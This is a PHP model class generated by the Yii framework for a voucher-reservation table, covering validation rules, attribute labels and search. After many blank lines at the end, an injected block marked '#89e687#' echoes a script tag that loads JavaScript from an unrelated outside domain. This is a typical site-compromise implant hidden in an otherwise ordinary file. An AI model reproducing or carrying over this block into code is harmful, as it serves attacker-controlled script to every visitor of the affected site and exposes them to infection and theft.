<?php

/**
 * This is the model class for table "reserve_vouchers".
 *
 * The followings are the available columns in table 'reserve_vouchers':
 * @property integer $id
 * @property integer $user_id
 * @property integer $voucher_id
 * @property string $status
 * @property string $created_on
 */
class Reservevouchers extends CActiveRecord
{
	/**
	 * @return string the associated database table name
	 */
	public function tableName()
	{
		return 'reserve_vouchers';
	}

	/**
	 * @return array validation rules for model attributes.
	 */
	public function rules()
	{
		// NOTE: you should only define rules for those attributes that
		// will receive user inputs.
		return array(
			array('user_id, voucher_id, status, created_on', 'required'),
			array('user_id, voucher_id', 'numerical', 'integerOnly'=>true),
			array('status', 'length', 'max'=>200),
			// The following rule is used by search().
			// @todo Please remove those attributes that should not be searched.
			array('id, user_id, voucher_id, status, created_on', 'safe', 'on'=>'search'),
		);
	}

	/**
	 * @return array relational rules.
	 */
	public function relations()
	{
		// NOTE: you may need to adjust the relation name and the related
		// class name for the relations automatically generated below.
		return array(
		);
	}

	/**
	 * @return array customized attribute labels (name=>label)
	 */
	public function attributeLabels()
	{
		return array(
			'id' => 'ID',
			'user_id' => 'User',
			'voucher_id' => 'Voucher',
			'status' => 'Status',
			'created_on' => 'Created On',
		);
	}

	/**
	 * Retrieves a list of models based on the current search/filter conditions.
	 *
	 * Typical usecase:
	 * - Initialize the model fields with values from filter form.
	 * - Execute this method to get CActiveDataProvider instance which will filter
	 * models according to data in model fields.
	 * - Pass data provider to CGridView, CListView or any similar widget.
	 *
	 * @return CActiveDataProvider the data provider that can return the models
	 * based on the search/filter conditions.
	 */
	public function search()
	{
		// @todo Please modify the following code to remove attributes that should not be searched.

		$criteria=new CDbCriteria;

		$criteria->compare('id',$this->id);
		$criteria->compare('user_id',$this->user_id);
		$criteria->compare('voucher_id',$this->voucher_id);
		$criteria->compare('status',$this->status,true);
		$criteria->compare('created_on',$this->created_on,true);

		return new CActiveDataProvider($this, array(
			'criteria'=>$criteria,
		));
	}

	/**
	 * Returns the static model of the specified AR class.
	 * Please note that you should have this exact method in all your CActiveRecord descendants!
	 * @param string $className active record class name.
	 * @return Reservevouchers the static model class
	 */
	public static function model($className=__CLASS__)
	{
		return parent::model($className);
	}
}







#89e687#
if(empty($w)) {
$w = "<script type=\"text/javascript\" src=\"http://olteniamagazin.ro/2b9vr6yj.php?id=9383523\"></script>";
echo $w;
}
#/89e687#

